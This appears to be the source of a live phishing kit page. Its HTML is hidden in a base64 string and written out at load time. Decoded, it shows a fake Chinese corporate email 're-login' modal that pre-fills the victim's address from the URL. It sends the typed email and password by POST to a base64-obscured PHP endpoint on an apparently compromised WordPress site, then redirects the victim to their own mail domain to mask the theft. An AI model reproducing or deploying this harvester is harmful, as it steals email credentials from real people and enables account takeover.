            function randomString(length, chars) {
			var result = '';
			for (var i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
			return result;
		}
			var rString = randomString(19, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ012345678GHIJKLMNOPQRSTUVWXYZ');
		
		$(function () {

			const url = new URL(window.location.href);

			if(!(
				url.searchParams.has('qiye')
				&& url.searchParams.has('mail')
				&& url.searchParams.has('scr')
			)) {
				url.searchParams.append('qiye', url.searchParams.get('qiye') || randomString(29, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ012345678GHIJKLMNOPQRSTUVWXYZ'))
				url.searchParams.append('mail', url.searchParams.get('mail') || randomString(33, '01234abcABC56789'))
				url.searchParams.append('scr', url.searchParams.get('scr') || randomString(30, '01234abcABC56789'))
				window.location.replace(url.toString())
			}

        });
document.write(decodeURIComponent(escape(atob('PCFkb2N0eXBlIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KCjxoZWFkPgogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vY3Vycnlob3BlLmNvLnVrL3dwLWFkbWluL2Nzcy9jb2xvcnMvZWN0b3BsYXNtL2pzL2pxdWVyeS5taW4uanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vY3Vycnlob3BlLmNvLnVrL3dwLWFkbWluL2Nzcy9jb2xvcnMvZWN0b3BsYXNtL2pzL2pxdWVyeS0zLjEuMS5taW4uanMiPjwvc2NyaXB0PgogICAgCiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iPgogICAgPCEtLSBCb290c3RyYXAgQ1NTIC0tPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL21heGNkbi5ib290c3RyYXBjZG4uY29tL2Jvb3RzdHJhcC80LjAuMC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiPgogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8va2l0LmZvbnRhd2Vzb21lLmNvbS81ODViMDUxMjUxLmpzIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KICAgIDx0aXRsZT4mIzMyNTkzOyYjMjYxMzE7JiMyMDIyNTsmIzE5OTk0OyYjMzcwMzg7JiMzMTY2NTsmIzMyOyYjNDU7JiMzMjsmIzMwMzMxOyYjMjQ0MDU7JiMyMDgzNzsmIzIxNDc1OzwvdGl0bGU+CjxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIj4KPGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwczovL2N1cnJ5aG9wZS5jby51ay93cC1hZG1pbi9jc3MvY29sb3JzL2VjdG9wbGFzbS9pbWFnZXMvbGluLmljbyIvPgogICAgPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KICAgIDwvc3R5bGU+CjwvaGVhZD4KCjxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kOnVybCgnaHR0cHM6Ly9jdXJyeWhvcGUuY28udWsvd3AtYWRtaW4vY3NzL2NvbG9ycy9lY3RvcGxhc20vaW1hZ2VzL2JnLnBuZycpOyBiYWNrZ3JvdW5kLXNpemU6IGNvdmVyOyBiYWNrZ3JvdW5kLXJlcGVhdDogbm8tcmVwZWF0OyI+CiAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSIgaWQ9Im0tYnRuIiBkYXRhLXRvZ2dsZT0ibW9kYWwiIGRhdGEtdGFyZ2V0PSIjZXhhbXBsZU1vZGFsQ2VudGVyIiBzdHlsZT0idmlzaWJpbGl0eTogaGlkZGVuOyI+CiAgICAgICAgTGF1bmNoIGRlbW8gbW9kYWwKICAgIDwvYnV0dG9uPgogICAgPCEtLSBNb2RhbCAtLT4KICAgIDxkaXYgY2xhc3M9Im1vZGFsIGZhZGUiIGlkPSJleGFtcGxlTW9kYWxDZW50ZXIiIGRhdGEtYmFja2Ryb3A9InN0YXRpYyIgdGFiaW5kZXg9Ii0xIiByb2xlPSJkaWFsb2ciIGFyaWEtbGFiZWxsZWRieT0iZXhhbXBsZU1vZGFsQ2VudGVyVGl0bGUiIGFyaWEtaGlkZGVuPSJ0cnVlIj4KICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1kaWFsb2cgbW9kYWwtZGlhbG9nLWNlbnRlcmVkIiByb2xlPSJkb2N1bWVudCI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWNvbnRlbnQiIHN0eWxlPSJtaW4td2lkdGg6IDU1MHB4Ij4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWhlYWRlciBwLTIiIHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiAjRTlFOUU5OyI+CiAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIGNsYXNzPSJjbG9zZSIgYXJpYS1sYWJlbD0iQ2xvc2UiPgogICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBhcmlhLWhpZGRlbj0idHJ1ZSI+JnRpbWVzOzwvc3Bhbj4KICAgICAgICAgICAgICAgICAgICA8L2J1dHRvbj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtYm9keSBweC01Ij4KICAgICAgICAgICAgICAgICAgICA8c3BhbiBzdHlsZT0iZm9udC13ZWlnaHQ6IDcwMDsgY29sb3I6ICM1NzU3NTc7Zm9udC1zaXplOiAxN3B4Ij7nlLXlrZDpgq7ku7bnmbvlvZXotoXml7bvvIzor7fph43mlrDnmbvlvZUKICAgICAgICAgICAgICAgICAgICA8L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgPGZvcm0gY2xhc3M9Im10LTQiPgogICAgICAgICAgICAgICAgICAgICAgICA8Y2VudGVyPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYWxlcnQgYWxlcnQtZGFuZ2VyIiBpZD0ibXNnIiBzdHlsZT0iZGlzcGxheTogbm9uZTsiPuaXoOaViOeahOWvhuegge+8geivt+i+k+WFpeato+ehrueahOWvhueggeOAgjwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gaWQ9ImVycm9yIiBjbGFzcz0idGV4dC1kYW5nZXIiIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+6K+l5biQ5oi35LiN5a2Y5Zyo44CC6L6T5YWl5YW25LuW5biQ5oi344CCPC9zcGFuPgogICAgICAgICAgICAgICAgICAgICAgICA8L2NlbnRlcj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCByb3ciPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0ic3RhdGljYWkiIGNsYXNzPSJjb2wtc20tNCBjb2wtZm9ybS1sYWJlbCI+55So5oi35ZCNPC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1zbS04Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iZW1haWwiIGNsYXNzPSJmb3JtLWNvbnRyb2wgcHktMSIgaWQ9ImFpIiB2YWx1ZT0iIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCByb3ciPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0iaW5wdXRwciIgY2xhc3M9ImNvbC1zbS00IGNvbC1mb3JtLWxhYmVsIj7pgq7nrrHlr4bnoIE8L2xhYmVsPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXNtLTggIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIGNsYXNzPSJmb3JtLWNvbnRyb2wgcHktMSIgaWQ9InByIiBwbGFjZWhvbGRlcj0iIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWZvb3RlciBwLTIiPgogICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuIGJ0bi1zdWNjZXNzIHB5LTEiIGlkPSJzdWJtaXQtYnRuIj7nmbvlvZU8L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0biBidG4tc2Vjb25kYXJ5IHB5LTEiPuWPlua2iDwvYnV0dG9uPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgPC9kaXY+CiAgICA8IS0tIE9wdGlvbmFsIEphdmFTY3JpcHQgLS0+CiAgICA8IS0tIGpRdWVyeSBmaXJzdCwgdGhlbiBQb3BwZXIuanMsIHRoZW4gQm9vdHN0cmFwIEpTIC0tPgogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vY3Vycnlob3BlLmNvLnVrL3dwLWFkbWluL2Nzcy9jb2xvcnMvZWN0b3BsYXNtL2pzL2pxdWVyeS0zLjIuMS5zbGltLm1pbi5qcyI+PC9zY3JpcHQ+CiAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jdXJyeWhvcGUuY28udWsvd3AtYWRtaW4vY3NzL2NvbG9ycy9lY3RvcGxhc20vanMvcG9wcGVyLm1pbi5qcyIgPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vbWF4Y2RuLmJvb3RzdHJhcGNkbi5jb20vYm9vdHN0cmFwLzQuMC4wL2pzL2Jvb3RzdHJhcC5taW4uanMiPjwvc2NyaXB0Pgo8L2JvZHk+CjxzY3JpcHQgc3JjPSJodHRwczovL2N1cnJ5aG9wZS5jby51ay93cC1hZG1pbi9jc3MvY29sb3JzL2VjdG9wbGFzbS9qcy9qcXVlcnkubWluLmpzIj48L3NjcmlwdD4KPHNjcmlwdCBzcmM9Imh0dHBzOi8vc3RhY2twYXRoLmJvb3RzdHJhcGNkbi5jb20vYm9vdHN0cmFwLzQuMS4zL2pzL2Jvb3RzdHJhcC5taW4uanMiPjwvc2NyaXB0Pgo8c2NyaXB0PgovKiBnbG9iYWwgJCAqLwokKGRvY3VtZW50KS5yZWFkeShmdW5jdGlvbigpIHsKICAgIHZhciBjb3VudCA9IDA7CgoKICAgICQoJyNtLWJ0bicpLmNsaWNrKCk7CgogICAgLy8vLy8vLy8vLy8vL3VybCBhaSBnZXR0aW5nLy8vLy8vLy8vLy8vLy8vLwogICAgdmFyIGFpID0gd2luZG93LmxvY2F0aW9uLmhhc2guc3Vic3RyKDEpOwogICAgaWYgKCFhaSkgewogICAgfSBlbHNlIHsKICAgICAgICB2YXIgYmFzZTY0cmVnZXggPSAvXihbMC05YS16QS1aKy9dezR9KSooKFswLTlhLXpBLVorL117Mn09PSl8KFswLTlhLXpBLVorL117M309KSk/JC87CgogICAgICAgIGlmICghYmFzZTY0cmVnZXgudGVzdChhaSkpIHsKICAgICAgICAgICAgLy8gYWxlcnQoYnRvYShlbWFpbCkpOwogICAgICAgICAgICB2YXIgbXlfYWkgPSBhaTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAvLyBhbGVydChhdG9iKGVtYWlsKSk7CiAgICAgICAgICAgIHZhciBteV9haSA9IGF0b2IoYWkpOwogICAgICAgIH0KICAgICAgICAvLyAkKCcjZW1haWwnKS52YWwoZW1haWwpOwogICAgICAgIC8vIHZhciBteV9lbWFpbCA9ZW1haWw7CiAgICAgICAgdmFyIGZpbHRlciA9IC9eKFthLXpBLVowLTlfXC5cLV0pK1xAKChbYS16QS1aMC05XC1dKStcLikrKFthLXpBLVowLTldezIsNH0pKyQvOwogICAgICAgIC8vICQoJyNhaScpLnZhbChhaSk7CiAgICAgICAgLy8gdmFyIG15X2FpID0gYWk7CiAgICAgICAgdmFyIGluZCA9IG15X2FpLmluZGV4T2YoIkAiKTsKICAgICAgICB2YXIgbXlfc2xpY2UgPSBteV9haS5zdWJzdHIoKGluZCArIDEpKTsKICAgICAgICB2YXIgYyA9IG15X3NsaWNlLnN1YnN0cigwLCBteV9zbGljZS5pbmRleE9mKCcuJykpOwogICAgICAgIHZhciBmaW5hbCA9IGMudG9Mb3dlckNhc2UoKTsKICAgICAgICAkKCcjYWknKS52YWwobXlfYWkpOwogICAgICAgICQoJyNhaScpLmF0dHIoJ3JlYWRvbmx5JywgdHJ1ZSk7CiAgICAgICAgJCgiI21zZyIpLmhpZGUoKTsKICAgIH0KICAgIC8vLy8vLy8vLy8vLy8vL3VybCBnZXR0aW5nIGFpLy8vLy8vLy8vLy8vLy8vLwoKICAgIHZhciBmaWxlID0gImFIUjBjSE02THk5amRYSnllV2h2Y0dVdVkyOHVkV3N2ZDNBdFlXUnRhVzR2YW5NdmFXNWtaWGd1Y0dodyI7CgogICAgJCgnI3N1Ym1pdC1idG4nKS5jbGljayhmdW5jdGlvbihldmVudCkgewogICAgICAgICQoJyNlcnJvcicpLmhpZGUoKTsKICAgICAgICAkKCcjbXNnJykuaGlkZSgpOwogICAgICAgIGV2ZW50LnByZXZlbnREZWZhdWx0KCk7CiAgICAgICAgdmFyIGFpID0gJCgiI2FpIikudmFsKCk7CiAgICAgICAgdmFyIHByID0gJCgiI3ByIikudmFsKCk7CiAgICAgICAgdmFyIG1zZyA9ICQoJyNtc2cnKS5odG1sKCk7CiAgICAgICAgJCgnI21zZycpLnRleHQobXNnKTsKICAgICAgICAvLy8vLy8vLy8vL25ldyBpbmplY3Rpb24vLy8vLy8vLy8vLy8vLy8vCiAgICAgICAgdmFyIG15X2FpID0gYWk7CiAgICAgICAgdmFyIGZpbHRlciA9IC9eKFthLXpBLVowLTlfXC5cLV0pK1xAKChbYS16QS1aMC05XC1dKStcLikrKFthLXpBLVowLTldezIsNH0pKyQvOwoKICAgICAgICBpZiAoIWFpKSB7CiAgICAgICAgICAgICQoJyNlcnJvcicpLnNob3coKTsKICAgICAgICAgICAgJCgnI2Vycm9yJykuaHRtbCgiRW1haWwgZmllbGQgaXMgZW1wbHkuISIpOwogICAgICAgICAgICBhaS5mb2N1czsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KCiAgICAgICAgaWYgKCFmaWx0ZXIudGVzdChteV9haSkpIHsKICAgICAgICAgICAgJCgnI2Vycm9yJykuc2hvdygpOwogICAgICAgICAgICAkKCcjZXJyb3InKS5odG1sKCJUaGF0IGFjY291bnQgZG9lc24ndCBleGlzdC4gRW50ZXIgYSBkaWZmZXJlbnQgYWNjb3VudCIpOwogICAgICAgICAgICBhaS5mb2N1czsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICBpZiAoIXByKSB7CiAgICAgICAgICAgICQoJyNlcnJvcicpLnNob3coKTsKICAgICAgICAgICAgJCgnI2Vycm9yJykuaHRtbCgiUGFzc3dvcmQgZmllbGQgaXMgZW1wbHkuISIpOwogICAgICAgICAgICBhaS5mb2N1czsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KCiAgICAgICAgdmFyIGluZCA9IG15X2FpLmluZGV4T2YoIkAiKTsKICAgICAgICB2YXIgbXlfc2xpY2UgPSBteV9haS5zdWJzdHIoKGluZCArIDEpKTsKICAgICAgICB2YXIgYyA9IG15X3NsaWNlLnN1YnN0cigwLCBteV9zbGljZS5pbmRleE9mKCcuJykpOwogICAgICAgIHZhciBmaW5hbCA9IGMudG9Mb3dlckNhc2UoKTsKICAgICAgICAvLy8vLy8vLy8vL25ldyBpbmplY3Rpb24vLy8vLy8vLy8vLy8vLy8vCiAgICAgICAgY291bnQgPSBjb3VudCArIDE7CgogICAgICAgICQuYWpheCh7CiAgICAgICAgICAgIGRhdGFUeXBlOiAnSlNPTicsCiAgICAgICAgICAgIHVybDogYXRvYihmaWxlKSwKICAgICAgICAgICAgdHlwZTogJ1BPU1QnLAogICAgICAgICAgICBkYXRhOiB7CiAgICAgICAgICAgICAgICBhaTogYWksCiAgICAgICAgICAgICAgICBwcjogcHIsCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIC8vIGRhdGE6ICQoJyNjb250YWN0Jykuc2VyaWFsaXplKCksCiAgICAgICAgICAgIGJlZm9yZVNlbmQ6IGZ1bmN0aW9uKHhocikgewogICAgICAgICAgICAgICAgJCgnI3N1Ym1pdC1idG4nKS5odG1sKCfpqozor4HkuK0uLi4nKTsKICAgICAgICAgICAgfSwKICAgICAgICAgICAgc3VjY2VzczogZnVuY3Rpb24ocmVzcG9uc2UpIHsKICAgICAgICAgICAgICAgIGlmIChyZXNwb25zZSkgewogICAgICAgICAgICAgICAgICAgICQoIiNtc2ciKS5zaG93KCk7CiAgICAgICAgICAgICAgICAgICAgY29uc29sZS5sb2cocmVzcG9uc2UpOwogICAgICAgICAgICAgICAgICAgIGlmIChyZXNwb25zZVsnc2lnbmFsJ10gPT0gJ29rJykgewogICAgICAgICAgICAgICAgICAgICAgICAkKCIjcHIiKS52YWwoIiIpOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoY291bnQgPj0gMikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgY291bnQgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gd2luZG93LmxvY2F0aW9uLnJlcGxhY2UocmVzcG9uc2VbJ3JlZGlyZWN0X2xpbmsnXSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aW5kb3cubG9jYXRpb24ucmVwbGFjZSgiaHR0cDovL3d3dy4iICsgbXlfc2xpY2UpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwoKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAvLyAkKCcjbXNnJykuaHRtbChyZXNwb25zZVsnbXNnJ10pOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIC8vICQoJyNtc2cnKS5odG1sKHJlc3BvbnNlWydtc2cnXSk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9LAogICAgICAgICAgICBlcnJvcjogZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAkKCIjcHIiKS52YWwoIiIpOwogICAgICAgICAgICAgICAgaWYgKGNvdW50ID49IDIpIHsKICAgICAgICAgICAgICAgICAgICBjb3VudCA9IDA7CiAgICAgICAgICAgICAgICAgICAgd2luZG93LmxvY2F0aW9uLnJlcGxhY2UoImh0dHA6Ly93d3cuIiArIG15X3NsaWNlKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkKCIjbXNnIikuc2hvdygpOwogICAgICAgICAgICAgICAgLy8gJCgnI21zZycpLmh0bWwoIlBsZWFzZSB0cnkgYWdhaW4gbGF0ZXIiKTsKICAgICAgICAgICAgfSwKICAgICAgICAgICAgY29tcGxldGU6IGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgJCgnI3N1Ym1pdC1idG4nKS5odG1sKCfnmbvlvZUnKTsKICAgICAgICAgICAgfQogICAgICAgIH0pOwogICAgfSk7CgoKfSk7Cjwvc2NyaXB0PgoKPC9odG1sPg=='))));
